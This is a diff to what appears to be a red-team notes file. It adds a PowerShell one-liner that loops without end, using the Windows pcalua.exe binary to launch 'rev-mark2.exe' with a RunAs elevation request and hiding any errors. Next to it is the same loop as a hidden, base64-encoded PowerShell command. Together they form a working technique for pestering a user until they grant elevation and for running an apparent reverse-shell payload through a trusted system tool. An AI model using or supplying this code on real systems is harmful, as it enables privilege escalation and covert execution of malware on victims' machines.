@@ -128,6 +128,14 @@ try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentL
 powershell -noni -w hidden -e dAByAHkAIAB7AHQAaAByAG8AdwAgACIAIgB9ACAAYwBhAHQAYwBoACAAewB3AGgAaQBsAGUAIAAoACAALQBuAG8AdAAgACQAPwAgACkAewB0AHIAeQAgAHsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAYwBhAGwAdQBhAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAGEAIABDADoAXABVAHMAZQByAHMAXAByAGUAZAB0AGUAYQBtAFwARABlAHMAawB0AG8AcABcAHIAZQB2AC0AbQBhAHIAawAyAC4AZQB4AGUAIgAgACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAH0AIABjAGEAdABjAGgAIAB7AFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACIAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQB9AH0AfQAgAA==
 ```
 
+## execute any powershell script
+
+```
+try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentList "-a C:\Users\redteam\Desktop\rev-mark2.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
+```
+
+---
+
 
 
 
